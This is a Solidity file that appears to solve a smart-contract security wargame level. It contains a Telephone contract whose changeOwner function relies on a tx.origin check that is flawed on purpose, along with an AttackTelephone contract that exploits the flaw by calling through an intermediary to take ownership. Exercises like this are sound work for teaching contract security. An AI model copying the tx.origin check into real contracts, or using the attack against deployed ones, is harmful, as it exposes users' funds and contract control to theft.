// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

interface ITelePhone {
    function changeOwner(address _owner) external;
    function owner() external view  returns (address);
}

contract AttackTelephone {
    function attack(address _telephone,address _newOwner) public{
        ITelePhone(_telephone).changeOwner(_newOwner);
    }

    function getOwner(address _telephone) public view  returns(address){
        return ITelePhone(_telephone).owner();
    }
}
